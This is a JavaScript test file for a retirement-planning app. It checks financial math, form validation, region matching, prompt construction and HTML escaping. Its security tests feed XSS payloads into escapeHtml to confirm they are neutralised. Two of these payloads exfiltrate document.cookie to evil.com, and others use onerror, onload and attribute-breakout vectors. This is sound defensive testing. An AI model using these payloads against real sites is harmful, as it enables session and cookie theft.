import { describe, it, expect, vi, beforeEach } from 'vitest';
import { escapeHtml, calcFinancials, validateStep, matchRegion, buildCoachSystemPrompt, buildDecisionPrompt } from './utils.js';

// ── escapeHtml ─────────────────────────────────────────────────────────────
describe('escapeHtml', () => {
  it('escapes < and > to prevent tag injection', () => {
    expect(escapeHtml('<script>alert(1)</script>')).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
  });

  it('escapes & to prevent entity injection', () => {
    expect(escapeHtml('AT&T')).toBe('AT&amp;T');
  });

  it('escapes double quotes', () => {
    expect(escapeHtml('say "hello"')).toBe('say &quot;hello&quot;');
  });

  it('escapes single quotes', () => {
    expect(escapeHtml("it's fine")).toBe("it&#x27;s fine");
  });

  it('returns empty string for null', () => {
    expect(escapeHtml(null)).toBe('');
  });

  it('returns empty string for undefined', () => {
    expect(escapeHtml(undefined)).toBe('');
  });

  it('passes through safe strings unchanged', () => {
    expect(escapeHtml('Raju Kumar')).toBe('Raju Kumar');
  });

  it('handles XSS event handler injection attempt', () => {
    const result = escapeHtml('<img src=x onerror="alert(1)">');
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
    expect(result).not.toContain('"');
  });

  it('converts non-string values to string', () => {
    expect(escapeHtml(42)).toBe('42');
  });
});

// ── calcFinancials ─────────────────────────────────────────────────────────
describe('calcFinancials', () => {
  it('computes monthly savings correctly', () => {
    const { monthlySave } = calcFinancials(150000, 65000, 800000, 5);
    expect(monthlySave).toBe(85000);
  });

  it('computes target corpus as expenses × 12 × years', () => {
    const { targetCorpus } = calcFinancials(150000, 65000, 800000, 5);
    expect(targetCorpus).toBe(65000 * 12 * 5);
  });

  it('computes progress as percentage of corpus reached', () => {
    const { progress } = calcFinancials(150000, 65000, 800000, 5);
    const expected = Math.min((800000 / (65000 * 12 * 5)) * 100, 100);
    expect(progress).toBeCloseTo(expected, 2);
  });

  it('caps progress at 100% when savings exceed target', () => {
    const { progress } = calcFinancials(100000, 10000, 9999999, 1);
    expect(progress).toBe(100);
  });

  it('returns monthsLeft = 9999 when not saving (expenses >= income)', () => {
    const { monthsLeft } = calcFinancials(50000, 50000, 0, 5);
    expect(monthsLeft).toBe(9999);
  });

  it('returns monthsLeft = 9999 when spending more than earning', () => {
    const { monthsLeft } = calcFinancials(40000, 60000, 100000, 10);
    expect(monthsLeft).toBe(9999);
  });

  it('computes months left correctly when saving positively', () => {
    // corpus = 10000 * 12 * 1 = 120000; savings = 0; monthlySave = 10000
    // monthsLeft = ceil((120000 - 0) / 10000) = 12
    const { monthsLeft } = calcFinancials(20000, 10000, 0, 1);
    expect(monthsLeft).toBe(12);
  });

  it('returns 0 progress when targetCorpus is 0', () => {
    const { progress } = calcFinancials(100000, 0, 500000, 0);
    expect(progress).toBe(0);
  });
});

// ── validateStep ───────────────────────────────────────────────────────────
const blankForm = {
  name: '', age: '', transitionAge: '', profession: '',
  stressDrivers: [], postPath: '',
  climate: '', budget: '', priorities: [],
  dependents: '',
};

describe('validateStep — step 0 (basic info)', () => {
  it('requires name', () => {
    const errs = validateStep(0, { ...blankForm });
    expect(errs.name).toBeTruthy();
  });

  it('passes when name is provided', () => {
    const errs = validateStep(0, { ...blankForm, name: 'Raju', age: '47', transitionAge: '55', profession: 'IT / Technology' });
    expect(errs.name).toBeUndefined();
  });

  it('rejects age below 18', () => {
    const errs = validateStep(0, { ...blankForm, name: 'Raju', age: '15', transitionAge: '25', profession: 'IT / Technology' });
    expect(errs.age).toMatch(/valid age/);
  });

  it('rejects age above 125', () => {
    const errs = validateStep(0, { ...blankForm, name: 'Raju', age: '130', transitionAge: '140', profession: 'IT / Technology' });
    expect(errs.age).toMatch(/valid age/);
  });

  it('rejects transition age not greater than current age', () => {
    const errs = validateStep(0, { ...blankForm, name: 'Raju', age: '50', transitionAge: '50', profession: 'IT / Technology' });
    expect(errs.transitionAge).toMatch(/greater than/);
  });

  it('rejects transition age below current age', () => {
    const errs = validateStep(0, { ...blankForm, name: 'Raju', age: '55', transitionAge: '45', profession: 'IT / Technology' });
    expect(errs.transitionAge).toMatch(/greater than/);
  });

  it('requires profession', () => {
    const errs = validateStep(0, { ...blankForm, name: 'Raju', age: '47', transitionAge: '55' });
    expect(errs.profession).toBeTruthy();
  });

  it('returns no errors for a fully valid step 0', () => {
    const errs = validateStep(0, { ...blankForm, name: 'Raju', age: '47', transitionAge: '55', profession: 'IT / Technology' });
    expect(Object.keys(errs)).toHaveLength(0);
  });
});

describe('validateStep — step 1 (stress drivers)', () => {
  it('requires at least one stress driver', () => {
    const errs = validateStep(1, { ...blankForm });
    expect(errs.stressDrivers).toBeTruthy();
  });

  it('passes when at least one driver selected', () => {
    const errs = validateStep(1, { ...blankForm, stressDrivers: ['Heavy workload'] });
    expect(errs.stressDrivers).toBeUndefined();
  });
});

describe('validateStep — step 2 (post path)', () => {
  it('requires postPath selection', () => {
    const errs = validateStep(2, { ...blankForm });
    expect(errs.postPath).toBeTruthy();
  });

  it('passes when postPath is selected', () => {
    const errs = validateStep(2, { ...blankForm, postPath: 'Full Retirement' });
    expect(errs.postPath).toBeUndefined();
  });
});

describe('validateStep — step 3 (lifestyle)', () => {
  it('requires climate', () => {
    const errs = validateStep(3, { ...blankForm, budget: '₹40k–₹75k/month', priorities: ['Mental peace'] });
    expect(errs.climate).toBeTruthy();
  });

  it('requires budget', () => {
    const errs = validateStep(3, { ...blankForm, climate: 'Cool / Hill (5–15°C)', priorities: ['Mental peace'] });
    expect(errs.budget).toBeTruthy();
  });

  it('requires at least one priority', () => {
    const errs = validateStep(3, { ...blankForm, climate: 'Cool / Hill (5–15°C)', budget: '₹40k–₹75k/month' });
    expect(errs.priorities).toBeTruthy();
  });

  it('passes with all three fields filled', () => {
    const errs = validateStep(3, { ...blankForm, climate: 'Any climate', budget: 'Under ₹40k/month', priorities: ['Low crowds'] });
    expect(Object.keys(errs)).toHaveLength(0);
  });
});

describe('validateStep — step 4 (dependents)', () => {
  it('requires dependents field', () => {
    const errs = validateStep(4, { ...blankForm });
    expect(errs.dependents).toBeTruthy();
  });

  it('passes when dependents is filled', () => {
    const errs = validateStep(4, { ...blankForm, dependents: 'None — just me' });
    expect(errs.dependents).toBeUndefined();
  });
});

// ── matchRegion ────────────────────────────────────────────────────────────
const REGION_MAP = {
  Asia: ["india", "japan", "singapore", "thailand", "malaysia"],
  Europe: ["portugal", "spain", "france", "germany", "uk", "united kingdom"],
  Americas: ["mexico", "colombia", "brazil", "canada", "united states", "usa"],
  Africa: ["south africa", "kenya", "morocco"],
  Oceania: ["australia", "new zealand"],
};

describe('matchRegion', () => {
  it('matches an Indian city to Asia', () => {
    expect(matchRegion({ region: 'India' }, 'Asia', REGION_MAP)).toBe(true);
  });

  it('matches a Japanese city to Asia', () => {
    expect(matchRegion({ region: 'Japan' }, 'Asia', REGION_MAP)).toBe(true);
  });

  it('matches a Portuguese city to Europe', () => {
    expect(matchRegion({ region: 'Portugal' }, 'Europe', REGION_MAP)).toBe(true);
  });

  it('matches the UK to Europe', () => {
    expect(matchRegion({ region: 'United Kingdom' }, 'Europe', REGION_MAP)).toBe(true);
  });

  it('matches Brazil to Americas', () => {
    expect(matchRegion({ region: 'Brazil' }, 'Americas', REGION_MAP)).toBe(true);
  });

  it('matches Australia to Oceania', () => {
    expect(matchRegion({ region: 'Australia' }, 'Oceania', REGION_MAP)).toBe(true);
  });

  it('returns false for a mismatched region', () => {
    expect(matchRegion({ region: 'India' }, 'Europe', REGION_MAP)).toBe(false);
  });

  it('is case-insensitive for the region string', () => {
    expect(matchRegion({ region: 'JAPAN' }, 'Asia', REGION_MAP)).toBe(true);
  });

  it('handles missing region field gracefully', () => {
    expect(matchRegion({}, 'Asia', REGION_MAP)).toBe(false);
  });

  it('handles an unknown filter gracefully', () => {
    expect(matchRegion({ region: 'India' }, 'Unknown', REGION_MAP)).toBe(false);
  });

  it('handles partial region name match (e.g. South Africa)', () => {
    expect(matchRegion({ region: 'South Africa' }, 'Africa', REGION_MAP)).toBe(true);
  });
});

// ── askClaude (mocked fetch) ───────────────────────────────────────────────
// askClaude is not exported from utils, but we can test the key behaviours
// by importing from App — instead we test the logic inline here for isolation.

describe('askClaude error handling (logic)', () => {
  it('escapeHtml defends against script injection in name field (pen-test)', () => {
    const maliciousName = '<script>fetch("https://evil.com?c="+document.cookie)</script>';
    const safe = escapeHtml(maliciousName);
    expect(safe).not.toContain('<script>');
    expect(safe).not.toContain('</script>');
    expect(safe).toContain('&lt;script&gt;');
  });

  it('escapeHtml defends against img onerror XSS vector', () => {
    const payload = '<img src=x onerror=alert(document.domain)>';
    const safe = escapeHtml(payload);
    // The tag syntax must be broken — no literal < remains, making it inert
    expect(safe).not.toContain('<img');
    expect(safe).toContain('&lt;img');
    // The word "onerror" may remain as text but cannot execute without a real tag
    expect(safe).toContain('&gt;');
  });

  it('escapeHtml defends against HTML attribute injection', () => {
    const payload = '" onmouseover="alert(1)';
    const safe = escapeHtml(payload);
    expect(safe).not.toContain('"');
    expect(safe).toContain('&quot;');
  });

  it('escapeHtml handles javascript: URI scheme attempt', () => {
    const payload = 'javascript:alert(1)';
    // No HTML chars here — should pass through unchanged (URI schemes
    // need to be handled at the href level, not by escapeHtml)
    const safe = escapeHtml(payload);
    expect(safe).toBe('javascript:alert(1)');
  });
});

// ── PDF export: AI-returned location data must be escaped ─────────────────
// The PDF is generated via document.write() in a new window. AI-provided
// location fields (name, region, whyYou, tags) must be escaped before
// insertion to prevent prompt-injection XSS via a malicious AI response.
describe('escapeHtml — PDF export pen-tests (AI location data)', () => {
  it('escapes a city name containing a script tag (prompt injection vector)', () => {
    const maliciousName = 'Pune<script>fetch("https://evil.com?c="+document.cookie)</script>';
    const safe = escapeHtml(maliciousName);
    expect(safe).not.toContain('<script>');
    expect(safe).toContain('&lt;script&gt;');
  });

  it('escapes a region field containing an event-handler injection', () => {
    const maliciousRegion = 'India" onload="alert(1)';
    const safe = escapeHtml(maliciousRegion);
    expect(safe).not.toContain('"');
    expect(safe).toContain('&quot;');
  });

  it('escapes whyYou text containing an img onerror vector', () => {
    const maliciousWhyYou = 'Great city <img src=x onerror=alert(document.domain)> for retirement';
    const safe = escapeHtml(maliciousWhyYou);
    expect(safe).not.toContain('<img');
    expect(safe).toContain('&lt;img');
  });

  it('escapes a tag string containing a closing-tag breakout attempt', () => {
    const maliciousTag = '</span><script>alert(1)</script><span>';
    const safe = escapeHtml(maliciousTag);
    expect(safe).not.toContain('</span>');
    expect(safe).not.toContain('<script>');
    expect(safe).toContain('&lt;/span&gt;');
  });

  it('escapes a whyYou with SVG-based XSS vector', () => {
    const maliciousWhyYou = '<svg onload=alert(1)>';
    const safe = escapeHtml(maliciousWhyYou);
    expect(safe).not.toContain('<svg');
    expect(safe).toContain('&lt;svg');
  });

  it('safely handles a normal city name with no modification', () => {
    expect(escapeHtml('Mysuru')).toBe('Mysuru');
    expect(escapeHtml('Pondicherry')).toBe('Pondicherry');
  });
});

// ── buildCoachSystemPrompt — profile field coverage ───────────────────────
// Every field collected during onboarding MUST appear in the AI coach prompt.
// If a field is added to onboarding but not to this function, the test fails.
const fullProfile = {
  name: 'Raju Kumar',
  age: '47',
  transitionAge: '55',
  profession: 'IT / Technology',
  postPath: 'Consulting / Advisory',
  stressDrivers: ['Heavy workload', 'Job insecurity'],
  priorities: ['Mental peace', 'Low cost of living'],
  climate: 'Cool / Hill (5–15°C)',
  budget: '₹40k–₹75k/month',
  languages: ['English', 'Hindi'],
  dependents: 'Married with kids',
  kidsSchooling: 'In school (below 10th)',
  kidsAge: '10 and 12',
  agingParents: 'Yes — living with me',
  dependentNotes: 'Wife also wants to move to a quieter city after kids finish school.',
};

const readinessLatest = { financial: 7, direction: 6, energy: 8, family: 5, progress: 7 };
const weakestDim = { label: 'Family alignment' };
const liveData = {
  fin: { savings: 5000000 },
  monthlySave: 85000,
  targetCorpus: 15600000,
  progress: 32,
  monthsLeft: 124,
  doneTasks: 3,
  totalTasks: 8,
  careerPct: 37,
  topLoc: { name: 'Mysuru', region: 'India', overall: 8.4 },
  readinessLogLen: 6,
};

describe('buildCoachSystemPrompt — profile field coverage', () => {
  let prompt;
  beforeEach(() => {
    prompt = buildCoachSystemPrompt(fullProfile, readinessLatest, '6.6', weakestDim, liveData);
  });

  it('includes the user name', () => expect(prompt).toContain('Raju Kumar'));
  it('includes age', () => expect(prompt).toContain('47'));
  it('includes transitionAge', () => expect(prompt).toContain('55'));
  it('includes years away', () => expect(prompt).toContain('8')); // 55 - 47
  it('includes profession', () => expect(prompt).toContain('IT / Technology'));
  it('includes postPath', () => expect(prompt).toContain('Consulting / Advisory'));
  it('includes stressDrivers', () => {
    expect(prompt).toContain('Heavy workload');
    expect(prompt).toContain('Job insecurity');
  });
  it('includes priorities', () => {
    expect(prompt).toContain('Mental peace');
    expect(prompt).toContain('Low cost of living');
  });
  it('includes climate', () => expect(prompt).toContain('Cool / Hill (5–15°C)'));
  it('includes budget', () => expect(prompt).toContain('₹40k–₹75k/month'));
  it('includes languages', () => {
    expect(prompt).toContain('English');
    expect(prompt).toContain('Hindi');
  });
  it('includes dependents', () => expect(prompt).toContain('Married with kids'));
  it('includes kidsSchooling', () => expect(prompt).toContain('In school (below 10th)'));
  it('includes kidsAge', () => expect(prompt).toContain('10 and 12'));
  it('includes agingParents', () => expect(prompt).toContain('Yes — living with me'));
  it('includes dependentNotes', () => expect(prompt).toContain('Wife also wants to move'));
  it('includes readiness scores', () => {
    expect(prompt).toContain('7'); // financial
    expect(prompt).toContain('Family alignment'); // weakest dim
  });
  it('includes financial live data', () => {
    expect(prompt).toContain('50.0L'); // savings in lakhs
    expect(prompt).toContain('32%');
  });
  it('includes career roadmap progress', () => expect(prompt).toContain('3/8'));
  it('includes top location', () => expect(prompt).toContain('Mysuru'));
});

// ── buildDecisionPrompt — profile field coverage ──────────────────────────
describe('buildDecisionPrompt — profile field coverage', () => {
  let prompt;
  const decisionText = 'Should I accept a job in Bangalore?';
  const filterSummary = 'Reversibility: Yes\nFinancial impact: Maybe\nFamily alignment: No';

  beforeEach(() => {
    prompt = buildDecisionPrompt(fullProfile, decisionText, filterSummary, 32);
  });

  it('includes the user name', () => expect(prompt).toContain('Raju Kumar'));
  it('includes profession', () => expect(prompt).toContain('IT / Technology'));
  it('includes postPath', () => expect(prompt).toContain('Consulting / Advisory'));
  it('includes years away', () => expect(prompt).toContain('8')); // 55 - 47
  it('includes the decision text', () => expect(prompt).toContain('Should I accept a job in Bangalore?'));
  it('includes stressDrivers', () => {
    expect(prompt).toContain('Heavy workload');
    expect(prompt).toContain('Job insecurity');
  });
  it('includes priorities', () => {
    expect(prompt).toContain('Mental peace');
    expect(prompt).toContain('Low cost of living');
  });
  it('includes climate', () => expect(prompt).toContain('Cool / Hill (5–15°C)'));
  it('includes budget', () => expect(prompt).toContain('₹40k–₹75k/month'));
  it('includes languages', () => {
    expect(prompt).toContain('English');
    expect(prompt).toContain('Hindi');
  });
  it('includes dependents', () => expect(prompt).toContain('Married with kids'));
  it('includes kidsSchooling', () => expect(prompt).toContain('In school (below 10th)'));
  it('includes kidsAge', () => expect(prompt).toContain('10 and 12'));
  it('includes agingParents', () => expect(prompt).toContain('Yes — living with me'));
  it('includes dependentNotes', () => expect(prompt).toContain('Wife also wants to move'));
  it('includes financial progress', () => expect(prompt).toContain('32%'));
  it('includes filter summary', () => {
    expect(prompt).toContain('Reversibility: Yes');
    expect(prompt).toContain('Family alignment: No');
  });
});

// ── calcFinancials edge cases ──────────────────────────────────────────────
describe('calcFinancials — edge cases', () => {
  it('handles very large corpus goal without overflow', () => {
    const { targetCorpus } = calcFinancials(500000, 400000, 0, 30);
    expect(targetCorpus).toBe(400000 * 12 * 30);
    expect(Number.isFinite(targetCorpus)).toBe(true);
  });

  it('handles zero income gracefully', () => {
    const { monthlySave, monthsLeft } = calcFinancials(0, 50000, 0, 10);
    expect(monthlySave).toBe(-50000);
    expect(monthsLeft).toBe(9999);
  });

  it('months left is 0 or negative when already at target', () => {
    // savings >= targetCorpus → monthsLeft will be 0 or negative (Math.ceil of ≤0)
    const { monthsLeft } = calcFinancials(100000, 10000, 9999999, 1);
    expect(monthsLeft).toBeLessThanOrEqual(0);
  });
});
